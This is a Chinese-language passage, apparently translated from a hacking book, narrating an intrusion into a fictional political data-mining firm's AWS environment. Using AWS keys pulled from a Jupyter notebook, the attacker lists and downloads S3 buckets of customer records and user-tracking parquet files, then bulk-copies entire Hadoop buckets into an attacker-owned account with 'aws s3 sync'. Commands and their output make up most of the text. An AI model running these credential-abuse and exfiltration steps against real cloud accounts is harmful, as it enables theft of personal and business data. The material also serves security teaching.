
① `s3a://gretsch-finance/portfolio/exports/2019/03/report1579446047119.csv`

`s3a://gretsch-hadoop/engine/aft-perf/...`

`s3a://gretsch-hadoop-us1/nj/media/engine/clickthrough/...`

`s3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...`

--snip--

看看第一个存储桶的名字：`gretsch-finance` ①。这应该很有趣。我们将使用从同一笔记本中检索到的其中一个 AWS 密钥，并卸载 `portfolio/exports/2020` 下的密钥：

```
root@Point1:~# aws s3 sync \
s3://gretsch-finance/portfolio/exports/2020/ ./exports_20/ --profile data1
```

```
root@Point1:~# ls exports_20/
./01/report1548892800915.csv
./02/report1551319200454.csv
./03/report1551578400344.csv
./04/report1553997600119.csv
--snip--
```

让我们采样一个随机文件：

```
root@Point1:~# head ./03/report1551578400344.csv
annual revenue, last contact, initial contact, country, account,
zip code, service purchased, ...
0.15, 20191204, 20180801, FRW nation, BR, 13010, 5...
0.11, 20200103, 20170103, RPU, US, 1101, 0...
```

这确实是一份客户名单！我们不仅获得了当前客户，还获得了潜在客户。详细信息包括他们上次被接触的时间、在哪里、由谁、他们购买的最后服务是什么，以及他们在平台上花费了多少。

> **NOTE** *机器学习算法处理分散的数字效果不佳。因此，通常的做法是将所有数字缩放到相同的范围，例如 0 到 1。如果最高年收入为 €1M，那么报告中的 0.15 相当于 €150K。*

利用这些数据，GP 能够深入了解其客户的消费习惯，并可能建立各种属性之间的隐藏关系，例如会面地点和收入——谁知道呢，可能性无穷无尽。如果你联系一家数据挖掘公司，你应该也预期自己会成为实验的一部分。这很公平。

几乎完成了一个目标。我们也许能找到更详细的信息，但就目前而言，我们已经拥有一个可靠的潜在客户和已验证客户名单。我们可以谷歌每条记录背后的政党，并为我们虚幻的民主而哭泣。

## Finding Raw Data

`gretsch-finance` 存储桶证明是成功的。让我们检查一下其余的存储桶：

```
root@Point1:~# egrep -R "s3[a|n]://" *
s3a://gretsch-hadoop/engine/aft-perf/...
s3a://gretsch-hadoop-us1/nj/dmp/thirdparty/segments/...
s3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...
--snip--
```

配置文件、社交、细分等等。文件名令人喜爱。这很可能就是我们要找的用户数据。请注意，`gretsch-hadoop-us1` 存储桶的名称暗示了区域化分区。有多少个区域，因此有多少个 Hadoop 存储桶？

```
root@Point1:~/# aws s3api list-buckets \
--profile data1 \
--query "Buckets[].Name"| grep Hadoop
gretsch-hadoop-usw1
gretsch-hadoop-euw1
gretsch-hadoop-apse1
```

我们为三个 AWS 区域（北加州、爱尔兰和新加坡）中的每一个找到了一个 Hadoop 存储桶。我们从 `gretsch-hadoop-usw1` 下载了 1,000 个文件，以查看其中包含哪些类型的工件：

```
root@Point1:~/# aws s3api list-objects-v2 \
--profile data1 \
--bucket=gretsch-hadoop-usw1 \
--max-items 1000
"Key": "engine/advertiser-session/2019/06/19/15/08/user_sessions_stats.parquet",
"Key": "engine/advertiser-session/2019/06/19/15/09/user_sessions_stats.parquet",
--snip--
```

我们看到一些扩展名为 `.parquet` 的文件。Parquet 是一种以列式格式存储数据而实现高压缩比的文件格式。它利用了一个准确的观察：在大多数数据库中，一列倾向于存储相同类型的数据（例如整数），而一行更可能存储不同类型的数据。与大多数数据库引擎按行分组数据不同，Parquet 按列分组数据，从而实现了超过 95% 的压缩比。

我们安装必要的工具来解压缩和操作 `.parquet` 文件，然后打开几个随机文件：

```
root@Point1:~/# python -m pip install parquet-cli
```

```
root@Point1:~/# parq 02/user_sessions_stats.parquet -head 100
userid = c9e2b1905962fa0b344301540e615b628b4b2c9f
interest_segment = 4878647678
ts = 1557900000
time_spent = 3
last_ad = 53f407233a5f0fe92bd462af6aa649fa
last_provider = 34
ip.geo.x = 52.31.46.2
--snip--
```

```
root@Point1:~/# parq 03/perf_stats.parquet -head 100
click = 2
referrer = 9735842
deviceUID = 03108db-65f2-4d7c-b884-bb908d111400
--snip--
```

```
root@Point1:~/# parq 03/social_stats.parquet -head 100
social_segment = 61895815510
fb_profile = 3232698
insta_profile = 987615915
pinterest_profile = 57928
--snip--
```

我们获取了用户 ID、社交资料、兴趣细分、广告花费时间、地理位置以及其他令人担忧的追踪用户行为的信息。现在我们的努力有了成果。数据杂乱无章，以专用格式存储且几乎无法解读，但我们最终会弄明白的。

我们可以在机器上配置几 TB 的存储空间，然后完全窃取这三个存储桶。相反，我们只是指示 AWS 将存储桶复制到我们自己的账户，但首先需要稍微调整一下以提高速度：

```
root@Point1:~/# aws configure set default.s3.max_concurrent_requests 1000
root@Point1:~/# aws configure set default.s3.max_queue_size 100000
root@Point1:~/# aws s3 sync s3://gretsch-hadoop/ s3://my-gretsch-hadoop
```

我们已经获得了三个 Hadoop 存储桶中的所有数据。不过别太兴奋；如果没有深入的探索、业务知识，当然还有计算能力，处理这些数据几乎是不可能的。说实话，我们远远超出了自己的能力范围。

Gretsch Politico 每天都用其庞大的数据专家队伍进行这种处理。我们不能利用他们的工作来窃取最终结果，而不是从头开始重新发明轮子吗？

## Stealing Processed Data

在 Spark 上进行数据处理和数据转换通常只是数据生命周期的第一步。一旦数据与其他输入丰富、交叉引用、格式化并扩展后，就会存储在第二种介质上。在那里，分析师（通常通过某种类 SQL 引擎）可以探索它，并最终将其输入到训练算法和预测模型（当然，这些模型可能在 Spark 上运行，也可能不在）。

问题是，GP 将其丰富和处理后的数据存储在哪里？最快的方法是搜索 Jupyter 笔记本中分析工具提及、类 SQL 查询、图表和仪表板等的线索（参见列表 12-9）。
